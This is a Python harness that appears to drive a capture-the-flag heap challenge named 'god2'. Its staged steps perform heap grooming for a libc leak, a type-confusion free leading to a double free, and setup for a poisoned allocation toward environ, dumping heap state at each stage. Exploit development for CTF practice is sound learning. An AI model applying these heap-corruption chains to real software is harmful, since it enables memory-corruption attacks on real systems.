import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G

STEP = sys.argv[1] if len(sys.argv)>1 else 'dup'

g=G('god2')
# ---- libc-leak groom (sets CC->next=&YY, 0x120 merge, clean) ----
g.add(b'UNIQ777')
g.add(b'A1'); g.add(b'B2'); g.cook(b'Beef noodles'); g.add(b'YY'); g.add(b'Z9'); g.cook(b'Beef noodles')
g.rm(b'B2'); g.rm(b'Z9'); g.rm(b'A1'); g.rm(b'YY')
g.add(b'CC')
if STEP=='grm':
    g.dump('after CC (libc groom)'); g.close(); sys.exit()

# ---- usable dish dup: cook E,D1,D3@YY ; rm UNIQ777 x2 ; sell ----
g.cook(b'Beef noodles')   # E = dish1
g.cook(b'Beef noodles')   # D1 = dish2
g.cook(b'UNIQ777')        # D3 = dish3 @ YY
if STEP=='pre':
    g.dump('after 3 cooks'); g.close(); sys.exit()

if STEP in ('pre2','pre2dup'):
    # add exploit recipes R + SLOT BEFORE any recipe free (should be clean)
    g.add(b'R'*16+b'A')       # R: title[0x10]=0x41 fake size
    g.add(b'SLOTXX')          # SLOT placeholder (real: p64(environ))
    if STEP=='pre2':
        g.dump('after add R,SLOT (pre-free)'); g.close(); sys.exit()
    # now continue the dup frees
    g.rm(b'UNIQ777'); g.rm(b'UNIQ777'); g.sell(b'1'); g.sell(b'3')
    g.add(b'FD1234')          # the ONE post-free add (will be poisoned)
    g.dump('pre2dup: after R,SLOT,dup,FD'); g.close(); sys.exit()

g.rm(b'UNIQ777')          # frees UNIQ777 recipe -> lone 0x90 ; CC->next now &D3
g.rm(b'UNIQ777')          # frees D3 via type-confusion ; CC->next = D3+0x80 = 0
g.sell(b'1')              # sell E (dish idx1)
g.sell(b'3')              # sell D3 (dish idx3) -> double free
if STEP=='dup':
    g.dump('after dup'); g.close(); sys.exit()

if STEP=='add1':
    g.add(b'MARK1')
    g.dump('after add MARK1'); g.close(); sys.exit()

if STEP=='add2':
    g.add(b'MARK1')
    g.add(b'MARK2')
    g.dump('after add MARK1,MARK2'); g.close(); sys.exit()

g.close()
